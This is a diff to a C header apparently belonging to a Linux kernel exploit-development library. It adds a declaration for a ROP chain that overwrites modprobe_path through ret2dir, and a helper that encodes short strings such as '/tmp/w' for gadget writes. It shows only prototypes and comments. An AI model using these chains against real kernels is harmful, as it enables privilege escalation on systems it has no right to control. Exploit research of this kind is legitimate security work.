@@ -64,6 +64,21 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
                         iretq_user_ctx_t ctx);
 
 
+/* ============= modprobe ============= 
+ * Attack with ret2dir 
+ *      by hijacking the modprobe_path
+ *      and trigger call_modprobe, which invokes the faked modprobe_path,
+ *      by calling a dummy trigger
+ *      via ret2dir_modprobe()
+ */
+size_t chain_modprobe_path(rop_buffer_t rop,
+                        uintptr_t modprobe_path_addr,
+                        const char *fake_modprobe_path,
+                        uintptr_t pop_rdi_ret,
+                        uintptr_t pop_rax_ret,
+                        rop_buffer_t mov_deref_rdi_rax_rop);
+
+
 /* ============= CR4 Hijack =============
  * Bit 20 (1 << 20): SMEP (Supervisor Mode Execution Protection)
  * Bit 21 (1 << 21): SMAP (Supervisor Mode Access Prevention)
@@ -74,7 +89,7 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
  *
  * [!] NOTE: Since Linux 5.1 (May 2019), native_write_cr4() enforces SMEP/SMAP bits.
  *     These bits can no longer be cleared via ROP or direct CR4 writes 
- * 		(will be reset automatically).
+ *		(will be reset automatically).
  *     This technique works only on Linux 4.x and older.
  */
 size_t chain_cr4_smep_smap(rop_buffer_t rop, 
@@ -125,6 +140,29 @@ size_t concat_rop_list(rop_buffer_t dst,
 #define COUNT_ROP(rop_chain_arr)                    \
     (sizeof(rop_chain_arr) / sizeof(uintptr_t))
 
+/*
+ * Encodes a short ASCII string (≤ 7 characters) into a 64-bit little-endian integer.
+ *
+ * This is commonly used in ROP chains where a full string (e.g., "/tmp/w")
+ * needs to be loaded into a register (like RAX) for a gadget such as:
+ *     mov qword ptr [rdi], rax; ret
+ *
+ * Since 64-bit registers can hold only 8 bytes, and the string must be
+ * null-terminated, the maximum usable length is 7 characters.
+ *
+ * For example:
+ *     encode_string_as_le64("/tmp/w") →
+ *         0x772f706d742f = 'w' '/' 'p' 'm' 't' '/' in little endian
+ *
+ * Parameters:
+ *     s - Null-terminated ASCII string to encode (must be ≤ 7 characters)
+ *
+ * Returns:
+ *     A uint64_t representing the little-endian encoded string
+ *
+ * Aborts the program if the input string exceeds 7 characters.
+ */
+uint64_t encode_string_as_le64(const char *s);
 
 
 #endif
